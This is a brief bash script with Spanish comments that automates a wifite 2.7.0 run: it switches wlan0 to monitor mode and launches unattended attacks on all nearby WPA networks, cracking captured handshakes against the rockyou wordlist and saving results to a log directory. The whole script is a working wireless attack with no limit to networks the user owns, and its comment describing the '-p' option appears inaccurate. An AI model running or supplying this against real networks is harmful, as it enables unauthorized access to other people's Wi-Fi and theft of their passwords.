#!/bin/bash

LOGDIR="/var/log/wifi/wifite"
mkdir -p "$LOGDIR"

DATE=$(date +"%Y%m%d_%H%M")
SESSION_DIR="$LOGDIR/session_$DATE"

echo "[*] Starting Wifite Automated Scan (v2.7.0)..."
mkdir -p "$SESSION_DIR"

# Poner wlan0 en modo monitor
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Ir al directorio de la sesión: TODO lo que genere wifite se queda aquí
cd "$SESSION_DIR" || exit 1

# wifite 2.7.0 – opciones DOCUMENTADAS:
#   -p   -> ataca todos los objetivos
#   -wpa   -> solo redes WPA
#   --dict  -> diccionario para crack
#   -wpat  -> tiempo máximo por ataque WPA (segundos)
#   timeout 25m -> por si se queda colgado

sudo timeout 25m wifite \
  --kill \
  -p 60 \
  -wpa \
  --dict /usr/share/wordlists/rockyou.txt \
  -wpat 120

echo "[✓] Completed Wifite run → resultados en: $SESSION_DIR"

